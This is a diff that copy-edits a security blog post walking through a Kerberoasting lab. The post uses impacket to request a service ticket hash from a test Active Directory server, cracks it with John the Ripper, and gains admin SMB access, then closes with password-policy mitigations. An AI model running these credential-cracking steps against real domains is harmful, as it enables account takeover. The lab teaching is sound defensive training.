@@ -5,7 +5,7 @@
 :tags: security, windows, vulnerability, credential
 :image: cover.png
 :alt: Toasting Marshmallow. Photo by hcmorr on Unsplash: https://unsplash.com/photos/qlHRuDvaxL8
-:description: Windows Active Directory is the most popular domain service out there. Companies around the world use it for their authentication and authorization services. Windows AD works using the Kerberos protocol, and we can exploit it's functionality to obtain user hashes.
+:description: Windows Active Directory is the most popular domain service out there. Companies worldwide use it for their authentication and authorization services. Windows AD works using the Kerberos protocol, and this blog will detail how we can exploit its functionality to obtain user hashes.
 :keywords: Windows, Security, Vulnerability, Hacking, Kerberos, Cracking.
 :author: Jonathan Armas
 :writer: johna
@@ -15,63 +15,63 @@
 
 = Roasting Kerberos
 
-+Kerberos+ is a protocol developed by the link:http://web.mit.edu/kerberos/[MIT]
-used to authenticate network services,
-is built using secret key cryptography
-and using a trusted third party server
-(named +Authentication Server+).
++Kerberos+ is a protocol developed by link:http://web.mit.edu/kerberos/[MIT]
+used to authenticate network services
+Kerberos is built using secret-key cryptography
+and uses a trusted third-party server
+called +Authentication Server+.
 This protocol authenticates users and services using tickets,
-when a client wants to log in
-it authenticates with the +Authentication Server+ (+AS+),
-which forwards the username to a +Key Distribution Center+ (+KDC+)
-and issues a +Ticket-Granting Ticket+ (+TGT+),
-this ticket is treated as the user's proof of identity.
+when a client logs in their identity
+is authenticated via the +Authentication Server+ (+AS+).
+The AS then forwards the username to a +Key Distribution Center+ (+KDC+)
+that issues a +Ticket-Granting Ticket+ (+TGT+).
+this ticket is the user's proof of identity.
 
-The process of how +kerberos+ protocol works is like this:
+This is how Kerberos protocol works:
 
-. The client sends a request to to the +AS+ soliciting a +TGT+,
-this request is built using the machine computer time
-and encrypting it with the users password hash.
-. Then the server verifies the users authentication data,
-and responds back to the client with a +TGT+
-and a session key for the +TGT+,
-since the +AD+ (Active Directory) has the password it can decrypt the request.
-. Now the client is able to request service tickets
-because it has a valid +TGT+ for the domain.
-Here the client sends a request for a service ticket.
-. Again the server verifies the validity of the +TGT+,
-then it responds back with the service ticket
+. A client sends a request to to the +AS+ soliciting a +TGT+.
+This request is built using the machine computer time
+and encrypting it with the user's password hash.
+. Because the AD (Active Directory) has the user's password
+it can decrypt the request. The server then can verify
+the user's authentication data and respond back
+to the client with a TGT and a session key for the TGT.
+. Because the user now has a valid TGT for the domain,
+they can send a request for a service ticket.
+. Now the server verifies the validity of the +TGT+
+and responds back with the service ticket
 and a service session key.
 
-+Kerberoast+ attack was discovered by link:https://twitter.com/TimMedin[Tim Medin],
-works by requesting Kerberos +TGTs+ to the +AS+
-(action that any valid domain user can do),
-this tickets are a hash
-that we can crack in order to access to the server
-with elevated privileges
-or to impersonate another user.
++Kerberoast+, discovered by link:https://twitter.com/TimMedin[Tim Medin],
+works by requesting Kerberos service tickets, +TGTs+,
+from the +Authentication Server+, +AS+,
+which is an action that any valid domain user can do.
+These service tickets are a hash
+that we can crack. We then have access to our target server
+which provides us with elevated privileges
+or even the ability to impersonate another user.
 
-In order to do this attack
-you will need a valid domain user,
+To do this
+you need a valid domain user,
 so any employee of an organization can exploit this.
 If you are an anonymous attacker on the network,
-there is several ways to obtain user credentials,
-this includes doing a +MDNS+ spoofing attack on the network
+there are several ways to obtain user credentials.
+These include doing an +MDNS+ spoofing attack on the network
 (link:https://github.com/SpiderLabs/Responder[Responder]),
 an Evil Twin attack to the wireless network
-if they have enterprise security,
-a phishing email attack
+if they have enterprise security
+or a phishing email attack
 that uses an enterprise login with the +AD+, among others.
 
 
 == Kerberoast lab
 
-To set up our lab we are going to use +Hashicorp's+ link:https://www.vagrantup.com/[Vagrant],
-here are the source files.
+To set up our lab we are going to use +Hashicorp's+ link:https://www.vagrantup.com/[Vagrant];
+the source files are below.
 Create a folder with the name +kerberoast+
-then save the +Vagrantfile+ there,
-also create another folder inside +kerberoast+ named +provision+
-and save the file +ad.ps1+ there:
+and save the +Vagrantfile+ there.
+Also create another folder inside +kerberoast+ named +provision+
+and save the file +ad.ps1+ there.
 
 .setting up the lab
 [source, bash, linenums]
@@ -122,14 +122,13 @@ kerberoast$ vagrant up
 ----
 
 This will create a +Windows+ machine
-with +Active Directory+ installed and configured,
-also will set our users to make this attack work,
-and set all the things that we will need.
+with +Active Directory+ installed and configured.
+At this point, everything we need has been completed
+and is ready for us to launch an attack.
 
-It could take a while so,
-we can start to set up our attacking machine.
+Now we can set up our attacking machine.
 Here we are using link:https://www.kali.org/[Kali Linux] with +Vagrant+ too,
-but you can use whatever +OS+ that you want.
+but you can use whatever +OS+ you prefer.
 
 This are the tools that we are going to use:
 
@@ -141,15 +140,15 @@ This are the tools that we are going to use:
 * link:https://github.com/magnumripper/JohnTheRipper[JohnTheRipper]
 
 If you are using +Kali+ the only thing that needs to be installed is +impacket+.
-We need to cloned it first:
+But first, we need to clone it.
 
-.clonning impacket
+.cloning impacket
 [source, bash]
 ----
 $ git clone https://github.com/SecureAuthCorp/impacket
 ----
 
-Then go to the folder and install it:
+Then go to the folder and install it.
 
 .installing impacket
 [source, bash, linenums]
@@ -167,10 +166,10 @@ We are ready to go.
 
 == Scanning our server
 
-First we need to check the server ports,
-we can use +nmap+ or +ncat+ to do it:
+First we need to check the server ports.
+We can use +nmap+ or +ncat+ to do it.
 
-.port scannning
+.port scanning
 [source, bash, linenums]
 ----
 $ nmap 192.168.56.2
@@ -208,11 +207,11 @@ PORT     STATE SERVICE
 ----
 
 +Kerberos+ runs on +port 88+
-and +SMB+ runs on +port 445+,
-we are going to use this services
-in order to attack the Domain Controller.
+and +SMB+ runs on +port 445+;
+we are going to use these services
+to attack the Domain Controller.
 
-Then using +smbmap+ we can check our permissions on the server:
+Then using +smbmap+ we can check our permissions on the server.
 
 .samba low privileges
 [source, bash]
@@ -235,8 +234,8 @@ $ smbmap -u kertest -p 'SuperSecure@123!!!' -H 192.168.56.2 -d sky.net
         SYSVOL                                                  READ ONLY
 ----
 
-As we can see, our user has no permissions on the server
-but is a valid domain user.
+As we can see, is a valid domain user,
+but has no permissions on the server
 
 == Kerberoasting
 
@@ -265,9 +264,9 @@ $krb5tgs$23$*kertest$SKY.NET$sky.net/kertest*$1639e200b950b6e566adad2ce3f3a336$b
 $krb5tgs$23$*svctest$SKY.NET$sky.net/svctest*$0fb0da3f22933a2893a6dac63e87538d$d11bb41bc5f41eeb4890ae74c42bff3ac203c649ef9740e70edb67113723df962b20c1346d82c7e410932944c881d3cb06a7cec0c21278ac1eeb2184867640f39b1ae725c02429ec9068fc6688102d576e4efb9c435f4207882601bff28414ababa2423cc4ea82d64082d8fe4eee797568dd514b4081a5338c08dd279fef2a3ade69efc2fe5502fd0a8e8cd8187761ff4c05322c00484e001832a28242d0c821ce44230eac54e2e4e36c365303ea729505ac9d35d7cc08077d07ea36c72e7ab12a04af392eeddcff37fd2e8a066e779ae26e0658ffa25f35a5c64f456a794676819dda35fe56514c1293f561750532d36a395069c8e98581f2b5d216254d7bed07e95dea36a4817ead880fe405711dae771e1660cadf3902fda1e0b730386aa02bc13bc8051ede7ee5388a919a4c20652ef241c47d66e21d026f5233bbd81dee6f01ad3887c32a9f4f0ab312939edcafa386eba04c32a0826f59b4009bd7fee5f6d78bcdeec80095fb1d0f189a87c26310b562bc4d94ffd19201a0bfa06a208d837a52bade076c2b34b8807f74bf51927b774e9f5047289d0d529beb58712d8eee673db3c77d28882a51bbfcf8dba96677af3b43a109c36b335b70dd0e316cce18877b7704e1ed837875cde1e7a462e35c9fe972318eb6d6d37ea222f00d5e81df343edfc1f50bd8907876c4dc1e77f01d9f5df3cb9e94f231a7a0eeb93aa62c22814742b06596eeb72824b4b0449cf6555fa020345bc21a84595437d50abb7cbe4287f580e47ed302faa9de47b68e9c3cab79ad2b1da17548f39aa8ace12372cb0d9952caee715535654f1f918ad5be3432b954bd7bae753152d919bcb93771fc9daf371ce724b18979f5180955d9ba6573d98f1042df80e5e7532fa96629e1b69f9e556df142fd8b0858243144c9f48a19d1933f280f8366c749fe6fb2b7b6c5f7781994f4d3f32552085ebc35ee4fa122a33978c32e877c0b48bc0cb19840bb7d349bbefb39ef1d062fc901b461a480e92e6121b3060f17c34fe92abad77ffebf687115da10b07081d35ef4a622916b656dd84c92643d477128d0a74a24ab23f69f61c94a7b0483313a31476cedc44a5c9efc55b18c57ebea38984f00e50d5773e25f7c6b3bcbc5ef73bf255ede5397ae334a72409440f8475b1f8b22730a456f81e6b08402c7c795aad026c01ca31b4fd8aac5bade44552787aec9c6b2407d2da24059014efdd88ee1953183f62b2e5e06ed7841438a7d4bd3635672b2
 ----
 
-Here we have our +TGTs+, they are +krbtgt hashes+
+Here we have our +TGTs+, they are +krbtgt hashes+,
 and there we can view another user on the server +svctest+.
-With this we save that user's +TGT+ on a file:
+With this, we save that user's +TGT+ on a file.
 
 .save hash
 [source, bash]
@@ -275,8 +274,8 @@ With this we save that user's +TGT+ on a file:
 echo '$krb5tgs$23$*svctest$SKY.NET$sky.net/svctest*$0fb0da3f22933a2893a6dac63e87538d$d11bb41bc5f41eeb4890ae74c42bff3ac203c649ef9740e70edb67113723df962b20c1346d82c7e410932944c881d3cb06a7cec0c21278ac1eeb2184867640f39b1ae725c02429ec9068fc6688102d576e4efb9c435f4207882601bff28414ababa2423cc4ea82d64082d8fe4eee797568dd514b4081a5338c08dd279fef2a3ade69efc2fe5502fd0a8e8cd8187761ff4c05322c00484e001832a28242d0c821ce44230eac54e2e4e36c365303ea729505ac9d35d7cc08077d07ea36c72e7ab12a04af392eeddcff37fd2e8a066e779ae26e0658ffa25f35a5c64f456a794676819dda35fe56514c1293f561750532d36a395069c8e98581f2b5d216254d7bed07e95dea36a4817ead880fe405711dae771e1660cadf3902fda1e0b730386aa02bc13bc8051ede7ee5388a919a4c20652ef241c47d66e21d026f5233bbd81dee6f01ad3887c32a9f4f0ab312939edcafa386eba04c32a0826f59b4009bd7fee5f6d78bcdeec80095fb1d0f189a87c26310b562bc4d94ffd19201a0bfa06a208d837a52bade076c2b34b8807f74bf51927b774e9f5047289d0d529beb58712d8eee673db3c77d28882a51bbfcf8dba96677af3b43a109c36b335b70dd0e316cce18877b7704e1ed837875cde1e7a462e35c9fe972318eb6d6d37ea222f00d5e81df343edfc1f50bd8907876c4dc1e77f01d9f5df3cb9e94f231a7a0eeb93aa62c22814742b06596eeb72824b4b0449cf6555fa020345bc21a84595437d50abb7cbe4287f580e47ed302faa9de47b68e9c3cab79ad2b1da17548f39aa8ace12372cb0d9952caee715535654f1f918ad5be3432b954bd7bae753152d919bcb93771fc9daf371ce724b18979f5180955d9ba6573d98f1042df80e5e7532fa96629e1b69f9e556df142fd8b0858243144c9f48a19d1933f280f8366c749fe6fb2b7b6c5f7781994f4d3f32552085ebc35ee4fa122a33978c32e877c0b48bc0cb19840bb7d349bbefb39ef1d062fc901b461a480e92e6121b3060f17c34fe92abad77ffebf687115da10b07081d35ef4a622916b656dd84c92643d477128d0a74a24ab23f69f61c94a7b0483313a31476cedc44a5c9efc55b18c57ebea38984f00e50d5773e25f7c6b3bcbc5ef73bf255ede5397ae334a72409440f8475b1f8b22730a456f81e6b08402c7c795aad026c01ca31b4fd8aac5bade44552787aec9c6b2407d2da24059014efdd88ee1953183f62b2e5e06ed7841438a7d4bd3635672b2' > hashkerber
 ----
 
-And then crack it using +john+,
-a +SecLists+ dictionary and +KoreLogic+ ruleset:
+And then we crack it using +john+,
+a +SecLists+ dictionary, and +KoreLogic+ ruleset.
 
 .john cracking
 [source, bash]
@@ -297,8 +296,8 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ----
 
-And is cracked! Then we can check our access
-running +smbmap+ again with our new set of credentials:
+And it's cracked! Now we can check our access
+running +smbmap+ again with our new set of credentials.
 
 .samba high privileges
 [source, bash]
@@ -322,12 +321,12 @@ $ smbmap -u svctest -p 'Monkey.123' -d sky.net -H 192.168.56.2
         [!] Unable to remove test directory at \\192.168.56.2\SYSVOL\edWFuwvkCb, plreae remove manually
 ----
 
-As you can see we now have administrative access on our server,
-you can try to access it by +RDP+ or retrieve files using +SMB+.
-Also you can dump the +SAM+ to get more users and hashes,
-this last ones are +NTLMv1+ and easily cracked.
+As you can see, we now have administrative access on our server.
+You can access it by +RDP+ or retrieve files using +SMB+.
+Also, you can dump the +SAM+ to get more users and hashes,
+these last ones are +NTLMv1+ and easily cracked.
 
-Here is the exploitation process:
+Here is the exploitation process.
 
 ++++
 <script id="asciicast-261241" src="https://asciinema.org/a/261241.js" async data-autoplay="true"  data-loop="true"></script>
@@ -335,22 +334,23 @@ Here is the exploitation process:
 
 === Solution
 
-There is no solution to this attack
-because it is exploiting the way of how the protocol works,
-any user in the domain can exploit this vulnerability
-and is only a question of time to crack those credentials.
+There is no easy solution because this attack
+exploits the same legitimate protocol Kerberos uses.
+Any user in the domain can exploit this vulnerability
+and is only a question of time before they crack the credentials.
 
-The way that you can mitigate this
-is by using a strong credential policy,
-that passwords must be longer than 20 characters,
-containing upper and lower cases, symbols, digits
-and not easily guessable, preferably passphrases.
+The way to mitigate this
+is by having and using a strong credential policy.
+Passwords must be longer than 20 characters,
+contain upper and lower case letters, contain symbols and digits
+and must not be easy to guess. This means you would be wise
+to adopt passphrases instead of simple passwords.
 
-This is specially useful when you are dealing with service credentials,
-because is the ones that are target the most.
-You can also put an alert when someone is logged in
-with your most critical and high privileged users.
+This is especially useful when you are dealing with service credentials
+because they are the ones most targeted.
+You can also set an alert to notify you when someone is logged in
+with your most critical and high-privileged users.
 
-If you want more information about strong credentials
+If you want more information about strong credentials,
 you can check our [inner]#link:../../rules/#credentials[rules]#
-about it.
+about them.
